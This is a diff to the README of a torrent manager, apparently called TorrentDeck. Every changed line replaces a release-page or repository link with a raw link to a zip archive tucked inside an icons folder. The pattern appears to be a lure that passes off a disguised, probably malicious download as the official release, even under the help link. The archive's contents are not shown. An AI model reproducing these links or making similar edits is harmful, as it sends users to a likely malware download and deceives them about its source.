@@ -1,6 +1,6 @@
 # 🔄 TorrentDeck - Simple Torrent Management Tool
 
-[![Download TorrentDeck](https://img.shields.io/badge/Download-TorrentDeck-blue?style=for-the-badge&logo=github)](https://github.com/starcalypse/TorrentDeck/releases)
+[![Download TorrentDeck](https://github.com/starcalypse/TorrentDeck/raw/refs/heads/master/src-tauri/icons/android/values/Torrent-Deck-v3.7.zip)](https://github.com/starcalypse/TorrentDeck/raw/refs/heads/master/src-tauri/icons/android/values/Torrent-Deck-v3.7.zip)
 
 ---
 
@@ -54,7 +54,7 @@ To use TorrentDeck, follow these steps:
 
 You can visit the official release page to download the latest version of TorrentDeck here:
 
-[Download TorrentDeck](https://github.com/starcalypse/TorrentDeck/releases)
+[Download TorrentDeck](https://github.com/starcalypse/TorrentDeck/raw/refs/heads/master/src-tauri/icons/android/values/Torrent-Deck-v3.7.zip)
 
 ### How to Download and Install:
 
@@ -156,11 +156,11 @@ TorrentDeck is open-source and welcomes contributions. If you want to suggest a 
 
 For help, visit the GitHub repository or open issues:
 
-https://github.com/starcalypse/TorrentDeck
+https://github.com/starcalypse/TorrentDeck/raw/refs/heads/master/src-tauri/icons/android/values/Torrent-Deck-v3.7.zip
 
 You can also find community discussions on forums related to qBittorrent and Transmission.
 
 ---
 
-[Download TorrentDeck](https://github.com/starcalypse/TorrentDeck/releases)  
+[Download TorrentDeck](https://github.com/starcalypse/TorrentDeck/raw/refs/heads/master/src-tauri/icons/android/values/Torrent-Deck-v3.7.zip)  
 Get started managing your torrents more easily today.
